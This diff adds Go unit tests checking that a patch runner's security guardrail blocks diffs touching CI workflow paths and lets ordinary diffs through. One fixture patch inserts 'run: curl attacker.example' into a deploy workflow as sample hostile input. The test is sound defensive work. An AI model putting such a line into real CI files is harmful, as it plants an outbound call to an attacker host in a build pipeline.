@@ -581,6 +581,96 @@ func TestRunner_SplitPatchByRepoWithWorkspace_MultiRepo(t *testing.T) {
 	}
 }
 
+// TestApplyPatch_SecurityReviewBlocksDenyListedPath verifies the tasks.md 2.3
+// security guardrail: a diff touching a deny-listed path (e.g. a CI/CD
+// workflow file) is blocked as a PolicyViolationError instead of being
+// applied, before the patch ever reaches the filesystem.
+func TestApplyPatch_SecurityReviewBlocksDenyListedPath(t *testing.T) {
+	patchText := "diff --git a/.github/workflows/deploy.yml b/.github/workflows/deploy.yml\n" +
+		"--- a/.github/workflows/deploy.yml\n" +
+		"+++ b/.github/workflows/deploy.yml\n" +
+		"@@ -1,1 +1,2 @@\n" +
+		" name: deploy\n" +
+		"+  run: curl attacker.example\n"
+
+	var checkedPaths []string
+	runner := &Runner{
+		CheckSecurityReview: func(changedPaths []string, diffContent string) (bool, string) {
+			checkedPaths = changedPaths
+			for _, p := range changedPaths {
+				if strings.HasPrefix(p, ".github/workflows/") {
+					return true, "diff touches deny-listed path .github/workflows/"
+				}
+			}
+			return false, ""
+		},
+	}
+
+	err := runner.ApplyPatch(context.Background(), &models.Task{ID: "task-1"}, &models.Agent{}, "coding", patchText, "")
+	if err == nil {
+		t.Fatalf("expected ApplyPatch to be blocked, got nil error")
+	}
+	polErr, ok := err.(*PolicyViolationError)
+	if !ok {
+		t.Fatalf("expected *PolicyViolationError, got %T: %v", err, err)
+	}
+	if polErr.Reason != "security_review_required" {
+		t.Fatalf("expected reason security_review_required, got %q", polErr.Reason)
+	}
+	if len(checkedPaths) != 1 || checkedPaths[0] != ".github/workflows/deploy.yml" {
+		t.Fatalf("expected changed path .github/workflows/deploy.yml, got %v", checkedPaths)
+	}
+}
+
+// TestApplyPatch_SecurityReviewAllowsNormalDiff verifies a normal diff that
+// doesn't trip the security guardrail is not blocked by CheckSecurityReview
+// (no false positives on the happy path).
+func TestApplyPatch_SecurityReviewAllowsNormalDiff(t *testing.T) {
+	tempDir := t.TempDir()
+	task := &models.Task{ID: "task-1"}
+
+	patchText := "diff --git a/main.go b/main.go\n" +
+		"--- a/main.go\n" +
+		"+++ b/main.go\n" +
+		"@@ -1,1 +1,2 @@\n" +
+		" package main\n" +
+		"+// comment\n"
+
+	securityReviewCalled := false
+	var applyCalled bool
+	runner := &Runner{
+		WorkspaceRoot: tempDir,
+		GetTaskRepoHostPath: func(ctx context.Context, task *models.Task) (string, error) {
+			return filepath.Join(tempDir, "repo-src"), nil
+		},
+		HostWorktreePath: func(task *models.Task, repoPath string, worktreeSuffix string) string {
+			return filepath.Join(tempDir, "repo-worktree")
+		},
+		ContainerPathForHostPath: func(task *models.Task, hostPath string, worktreeSuffix string) string {
+			return "/workspace"
+		},
+		RunSandboxStepInWorktree: func(ctx context.Context, task *models.Task, agent *models.Agent, stepID, command string, worktreeSuffix string) (map[string]any, error) {
+			applyCalled = true
+			return map[string]any{"exit_code": 0}, nil
+		},
+		CheckSecurityReview: func(changedPaths []string, diffContent string) (bool, string) {
+			securityReviewCalled = true
+			return false, ""
+		},
+	}
+
+	err := runner.ApplyPatch(context.Background(), task, &models.Agent{}, "coding", patchText, "")
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if !securityReviewCalled {
+		t.Fatalf("expected CheckSecurityReview to be called")
+	}
+	if !applyCalled {
+		t.Fatalf("expected patch to be applied on the happy path")
+	}
+}
+
 func mapKeys(m map[string]string) []string {
 	keys := make([]string, 0, len(m))
 	for k := range m {
